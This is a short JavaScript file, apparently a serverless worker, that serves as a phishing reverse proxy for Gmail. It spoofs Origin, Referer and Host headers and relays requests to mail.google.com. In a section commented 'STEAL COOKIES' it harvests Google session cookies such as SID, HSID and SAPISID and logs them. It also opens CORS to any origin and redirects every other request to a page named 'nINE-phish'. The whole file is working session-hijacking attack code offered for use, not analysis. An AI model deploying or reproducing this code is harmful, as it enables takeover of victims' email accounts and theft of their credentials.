// YOUR gmail-proxy.js from repo (SID/HSID interceptor)
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  if (url.pathname.startsWith('/mail/')) {
    url.hostname = 'mail.google.com'
    
    // SPOOF HEADERS
    const headers = new Headers(request.headers)
    headers.set('Origin', 'https://mail.google.com')
    headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox')
    headers.set('Host', 'mail.google.com')
    
    const proxyReq = new Request(url.toString(), {
      method: request.method,
      headers,
      body: request.body
    })
    
    const response = await fetch(proxyReq)
    
    // STEAL COOKIES
    const cookies = response.headers.get('Set-Cookie')
    if (cookies) {
      const highValue = cookies.match(/(SID|HSID|SSID|APISID|SAPISID|__Secure-3PSID)=[^;]+/g)
      if (highValue) console.log('TOKENS:', highValue.join(', '))
    }
    
    // SPOOF BACK
    const newHeaders = new Headers(response.headers)
    newHeaders.set('Access-Control-Allow-Origin', '*')
    
    return new Response(response.body, {
      status: response.status,
      headers: newHeaders
    })
  }
  return Response.redirect('https://ia7353038-crypto.github.io/nINE-phish/', 302)
}
